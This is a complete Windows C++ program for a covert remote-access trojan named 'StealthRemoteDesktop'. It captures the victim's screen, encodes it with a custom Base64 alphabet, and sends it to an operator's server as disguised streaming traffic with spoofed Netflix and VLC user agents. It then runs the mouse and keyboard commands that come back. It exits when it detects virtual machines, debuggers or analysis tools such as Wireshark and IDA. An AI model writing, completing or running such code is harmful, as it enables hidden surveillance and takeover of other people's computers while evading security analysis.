#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <vector>
#include <cstdlib>
#include <fstream>
#include <algorithm>
#include <queue>
#include <mutex>

#include <windows.h>
#include <winhttp.h>
#include <shlwapi.h>
#include <gdiplus.h>
#include <tlhelp32.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
using namespace Gdiplus;

// Base64 with custom alphabet for stealth
class StealthBase64 {
private:
    static const std::string chars;
    
public:
    static std::string encode(const std::vector<BYTE>& input) {
        std::string result;
        int val = 0, valb = -6;
        for (BYTE c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }

    static std::string decode(const std::string& input) {
        std::vector<int> T(256, -1);
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::string result;
        int val = 0, valb = -8;
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return result;
    }
};

const std::string StealthBase64::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";

// Simple compression for screen data
class SimpleCompressor {
public:
    static std::vector<BYTE> compressRLE(const std::vector<BYTE>& data) {
        std::vector<BYTE> compressed;
        if (data.empty()) return compressed;
        
        for (size_t i = 0; i < data.size(); ) {
            BYTE current = data[i];
            BYTE count = 1;
            
            while (i + count < data.size() && data[i + count] == current && count < 255) {
                count++;
            }
            
            if (count >= 3 || current == 0) {
                compressed.push_back(0xFF);
                compressed.push_back(count);
                compressed.push_back(current);
            } else {
                for (BYTE j = 0; j < count; j++) {
                    compressed.push_back(current);
                }
            }
            i += count;
        }
        return compressed;
    }
};

// Anti-detection and evasion techniques
class StealthChecker {
public:
    static bool isVMEnvironment() {
        HKEY hKey;
        const char* vmKeys[] = {
            "HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer",
            "HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemProductName"
        };
        
        for (const char* keyPath : vmKeys) {
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                char buffer[256];
                DWORD bufferSize = sizeof(buffer);
                if (RegQueryValueExA(hKey, "", nullptr, nullptr, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                    std::string value = buffer;
                    std::transform(value.begin(), value.end(), value.begin(), ::tolower);
                    
                    std::vector<std::string> vmSigns = {"vmware", "virtualbox", "qemu", "virtual", "hyper-v"};
                    for (const auto& sign : vmSigns) {
                        if (value.find(sign) != std::string::npos) {
                            RegCloseKey(hKey);
                            return true;
                        }
                    }
                }
                RegCloseKey(hKey);
            }
        }
        return false;
    }
    
    static bool hasAnalysisTools() {
        std::vector<std::string> badProcesses = {
            "wireshark.exe", "procmon.exe", "ollydbg.exe", "x64dbg.exe",
            "ida.exe", "ida64.exe", "fiddler.exe", "tcpview.exe"
        };
        
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &pe32)) {
                do {
                    std::string processName = pe32.szExeFile;
                    std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                    
                    for (const auto& bad : badProcesses) {
                        if (processName.find(bad) != std::string::npos) {
                            CloseHandle(snapshot);
                            return true;
                        }
                    }
                } while (Process32Next(snapshot, &pe32));
            }
            CloseHandle(snapshot);
        }
        return false;
    }
    
    static bool isDebuggerPresent() {
        return IsDebuggerPresent();
    }
};

class StealthRemoteDesktop {
private:
    std::string server_host;
    int server_port;
    std::string session_id;
    std::random_device rd;
    std::mt19937 gen;
    
    // Screen capture state
    int screen_width;
    int screen_height;
    std::vector<BYTE> last_screen_data;
    
    // User agents for stealth - mimic streaming services
    std::vector<std::string> streaming_agents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "VLC/3.0.16 LibVLC/3.0.16",
        "Mozilla/5.0 (compatible; Netflix/1.0; Windows NT 10.0)"
    };
    
    struct HttpResponse {
        int status_code;
        std::string body;
        bool success;
    };
    
    HttpResponse makeStealthRequest(const std::string& method, const std::string& path, const std::string& data = "", const std::string& content_type = "application/json") {
        HttpResponse response = {0, "", false};
        
        HINTERNET hSession = nullptr, hConnect = nullptr, hRequest = nullptr;
        
        try {
            // Rotate user agents to mimic streaming services
            std::uniform_int_distribution<> dis(0, streaming_agents.size() - 1);
            std::string userAgent = streaming_agents[dis(gen)];
            std::wstring wUserAgent(userAgent.begin(), userAgent.end());
            
            hSession = WinHttpOpen(wUserAgent.c_str(),
                                  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME,
                                  WINHTTP_NO_PROXY_BYPASS, 0);
            
            if (!hSession) return response;
            
            std::wstring whost(server_host.begin(), server_host.end());
            hConnect = WinHttpConnect(hSession, whost.c_str(), server_port, 0);
            if (!hConnect) return response;
            
            std::wstring wpath(path.begin(), path.end());
            std::wstring wmethod(method.begin(), method.end());
            
            hRequest = WinHttpOpenRequest(hConnect, wmethod.c_str(), wpath.c_str(),
                                        nullptr, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                        WINHTTP_FLAG_BYPASS_PROXY_CACHE);
            
            if (!hRequest) return response;
            
            // Headers that mimic video streaming
            std::stringstream headerStream;
            headerStream << "Content-Type: " << content_type << "\r\n";
            headerStream << "Accept: */*\r\n";
            headerStream << "Accept-Encoding: gzip, deflate\r\n";
            headerStream << "Accept-Language: en-US,en;q=0.9\r\n";
            headerStream << "Cache-Control: no-cache\r\n";
            headerStream << "Connection: keep-alive\r\n";
            
            if (path.find("/stream/") != std::string::npos) {
                headerStream << "Range: bytes=0-\r\n";
                headerStream << "X-Requested-With: XMLHttpRequest\r\n";
                headerStream << "Sec-Fetch-Site: same-origin\r\n";
                headerStream << "Sec-Fetch-Mode: cors\r\n";
            }
            
            std::string headers = headerStream.str();
            std::wstring wheaders(headers.begin(), headers.end());
            
            BOOL result = FALSE;
            if (!data.empty()) {
                result = WinHttpSendRequest(hRequest, wheaders.c_str(), -1,
                                          (LPVOID)data.c_str(), data.length(),
                                          data.length(), 0);
            } else {
                result = WinHttpSendRequest(hRequest, wheaders.c_str(), -1,
                                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            }
            
            if (!result) return response;
            
            result = WinHttpReceiveResponse(hRequest, nullptr);
            if (!result) return response;
            
            DWORD statusCode = 0;
            DWORD dwSize = sizeof(statusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                              WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
            response.status_code = statusCode;
            
            std::string responseBody;
            DWORD dwDownloaded = 0;
            do {
                dwSize = 0;
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
                if (dwSize == 0) break;
                
                std::vector<char> buffer(dwSize + 1);
                if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) break;
                responseBody.append(buffer.data(), dwDownloaded);
            } while (dwSize > 0);
            
            response.body = responseBody;
            response.success = true;
            
        } catch (...) {
            response.success = false;
        }
        
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);
        
        return response;
    }
    
    std::vector<BYTE> captureScreen() {
        // Get screen dimensions
        screen_width = GetSystemMetrics(SM_CXSCREEN);
        screen_height = GetSystemMetrics(SM_CYSCREEN);
        
        // Create device contexts
        HDC hdcScreen = GetDC(nullptr);
        HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
        
        // Create bitmap
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMemDC, hBitmap);
        
        // Copy screen to memory
        BitBlt(hdcMemDC, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);
        
        // Get bitmap data
        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);
        
        BITMAPINFOHEADER bi;
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp.bmWidth;
        bi.biHeight = -bmp.bmHeight; // Top-down bitmap
        bi.biPlanes = 1;
        bi.biBitCount = 24; // 24-bit for smaller size
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;
        
        int imageSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
        std::vector<BYTE> imageData(imageSize);
        
        GetDIBits(hdcScreen, hBitmap, 0, bmp.bmHeight, imageData.data(), 
                  (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        // Cleanup
        SelectObject(hdcMemDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMemDC);
        ReleaseDC(nullptr, hdcScreen);
        
        return imageData;
    }
    
    void processRemoteInput(const std::string& inputData) {
        // Parse input: type:x:y or type:key
        std::istringstream iss(inputData);
        std::string type;
        if (!std::getline(iss, type, ':')) return;
        
        if (type == "click") {
            int x, y;
            if (iss >> x && iss.ignore() && iss >> y) {
                SetCursorPos(x, y);
                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
            }
        } else if (type == "rightclick") {
            int x, y;
            if (iss >> x && iss.ignore() && iss >> y) {
                SetCursorPos(x, y);
                mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
            }
        } else if (type == "move") {
            int x, y;
            if (iss >> x && iss.ignore() && iss >> y) {
                SetCursorPos(x, y);
            }
        } else if (type == "key") {
            std::string key;
            if (std::getline(iss, key)) {
                if (key.length() == 1) {
                    char c = key[0];
                    SHORT vk = VkKeyScan(c);
                    keybd_event(LOBYTE(vk), 0, 0, 0);
                    keybd_event(LOBYTE(vk), 0, KEYEVENTF_KEYUP, 0);
                } else if (key == "ENTER") {
                    keybd_event(VK_RETURN, 0, 0, 0);
                    keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
                } else if (key == "ESCAPE") {
                    keybd_event(VK_ESCAPE, 0, 0, 0);
                    keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
                }
            }
        }
    }
    
    void adaptiveDelay() {
        // Mimic video streaming intervals (24-30 FPS)
        std::uniform_int_distribution<> dis(33, 42); // 33-42ms = ~24-30 FPS
        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    }

public:
    StealthRemoteDesktop(const std::string& host, int port) 
        : server_host(host), server_port(port), gen(rd()) {
        screen_width = 0;
        screen_height = 0;
    }
    
    bool performAdvancedStealthChecks() {
        if (StealthChecker::isDebuggerPresent()) {
            std::cout << "[-] Debugger detected" << std::endl;
            return false;
        }
        
        if (StealthChecker::isVMEnvironment()) {
            std::cout << "[-] Virtual machine detected" << std::endl;
            return false;
        }
        
        if (StealthChecker::hasAnalysisTools()) {
            std::cout << "[-] Analysis environment detected" << std::endl;
            return false;
        }
        
        return true;
    }
    
    bool registerSession() {
        HttpResponse response = makeStealthRequest("GET", "/api/connect");
        
        if (response.success && response.status_code == 200) {
            size_t pos = response.body.find("\"session\":\"");
            if (pos != std::string::npos) {
                pos += 11;
                size_t end = response.body.find("\"", pos);
                if (end != std::string::npos) {
                    session_id = response.body.substr(pos, end - pos);
                    return true;
                }
            }
        }
        return false;
    }
    
    void checkForInputCommands() {
        std::string path = "/api/input/" + session_id;
        HttpResponse response = makeStealthRequest("GET", path);
        
        if (response.success && response.status_code == 200 && !response.body.empty()) {
            size_t pos = response.body.find("\"input\":\"");
            if (pos != std::string::npos) {
                pos += 9;
                size_t end = response.body.find("\"", pos);
                if (end != std::string::npos) {
                    std::string inputCmd = response.body.substr(pos, end - pos);
                    if (!inputCmd.empty()) {
                        std::string decoded = StealthBase64::decode(inputCmd);
                        processRemoteInput(decoded);
                    }
                }
            }
        }
    }
    
    void sendScreenFrame() {
        std::vector<BYTE> screenData = captureScreen();
        
        // Only send if screen changed significantly
        bool screenChanged = true;
        if (!last_screen_data.empty() && last_screen_data.size() == screenData.size()) {
            size_t differences = 0;
            for (size_t i = 0; i < screenData.size(); i += 100) {
                if (screenData[i] != last_screen_data[i]) differences++;
            }
            screenChanged = (differences > screenData.size() / 10000);
        }
        
        if (screenChanged) {
            // Compress the screen data
            std::vector<BYTE> compressed = SimpleCompressor::compressRLE(screenData);
            std::string encoded = StealthBase64::encode(compressed);
            
            // Create streaming-like payload
            std::stringstream payload;
            payload << "{";
            payload << "\"session\":\"" << session_id << "\",";
            payload << "\"timestamp\":" << std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::system_clock::now().time_since_epoch()).count() << ",";
            payload << "\"width\":" << screen_width << ",";
            payload << "\"height\":" << screen_height << ",";
            payload << "\"format\":\"rgb24\",";
            payload << "\"data\":\"" << encoded << "\"";
            payload << "}";
            
            // Send as streaming chunk
            makeStealthRequest("POST", "/api/stream/" + session_id, payload.str(), "application/x-mpegURL");
            
            last_screen_data = screenData;
        }
    }
    
    void run() {
        std::cout << "[+] Starting Stealth Remote Desktop..." << std::endl;
        std::cout << "[+] Target: " << server_host << ":" << server_port << std::endl;
        
        // Anti-analysis checks
        if (!performAdvancedStealthChecks()) {
            std::cout << "[-] Stealth check failed, exiting" << std::endl;
            return;
        }
        
        if (!registerSession()) {
            std::cout << "[-] Registration failed" << std::endl;
            return;
        }
        
        std::cout << "[+] Connected! Session: " << session_id << std::endl;
        std::cout << "[+] Streaming desktop at " << screen_width << "x" << screen_height << std::endl;
        
        // Main loop
        while (true) {
            try {
                sendScreenFrame();
                checkForInputCommands();
                adaptiveDelay();
                
            } catch (const std::exception& e) {
                std::cout << "[-] Error: " << e.what() << std::endl;
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <server_host> <server_port>" << std::endl;
        return 1;
    }
    
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
    
    std::string host = argv[1];
    int port = std::stoi(argv[2]);
    
    StealthRemoteDesktop client(host, port);
    client.run();
    
    GdiplusShutdown(gdiplusToken);
    
    return 0;
}